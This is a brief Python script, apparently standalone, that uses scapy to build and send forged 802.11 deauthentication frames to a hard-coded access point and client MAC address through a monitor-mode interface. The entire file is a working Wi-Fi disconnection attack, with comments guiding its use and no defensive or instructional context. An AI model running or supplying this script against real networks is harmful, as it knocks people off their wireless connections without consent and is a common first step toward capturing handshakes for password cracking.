from scapy.all import *

# Access Point MAC Address
ap = "dc-a4-ca-5c-31-07"

# Client MAC Address
client = "9C:5C:F9:28:63:89"

# Deauthentication Packet For Access Point
pkt = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()

# Deauthentication Packet For Client
#             Use This Option Only If you Have Client MAC Address
pkt1 = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()


# send Packets To Access Point and 
#           In Arguments, iface = monitor mode enable Interface  
sendp(pkt, iface="mon0")

# send Packet To Client
sendp(pkt1, iface="mon0")